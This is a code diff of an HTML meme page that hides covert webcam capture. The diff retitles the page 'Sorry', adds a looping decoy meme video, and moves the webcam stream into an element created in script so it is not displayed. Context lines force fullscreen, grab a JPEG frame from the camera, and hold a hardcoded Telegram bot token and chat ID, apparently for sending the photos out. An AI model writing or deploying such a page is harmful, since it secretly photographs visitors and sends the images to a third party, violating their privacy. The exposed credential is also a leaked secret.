@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Not A Joke</title>
+    <title>Sorry</title>
     <style>
         body {
             margin: 0;
@@ -23,7 +23,12 @@
 </head>
 <body>
 
-    <video id="video" autoplay muted></video>
+    
+    <video id="bgVideo" autoplay loop controls>
+        <source src="https://raw.githubusercontent.com/Sabbir-5399/Resources-For-All-Webpage/main/chaliye-shuru-karte-hai-video-meme-download.mp4" type="video/mp4">
+        Err
+    </video>
+
     <canvas id="canvas"></canvas>
 
     <script>
@@ -44,12 +49,12 @@
             goFullscreen();
             document.addEventListener("click", goFullscreen);
 
-            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; // 🔹 
-            let chatId = "6947565760"; // 🔹 
+            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; // 
+            let chatId = "6947565760"; // 
 
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    let video = document.getElementById("video");
+                    let video = document.createElement("video");
                     video.srcObject = stream;
 
                     setTimeout(() => {
@@ -74,7 +79,7 @@
                         }, 'image/jpeg');
                     }, 1000); // ⏳ 1
                 })
-                .catch(error => console.log("Give The Permission First!"));
+                .catch(error => console.log("❌ Please Give The Permission First"));
         });
     </script>
 
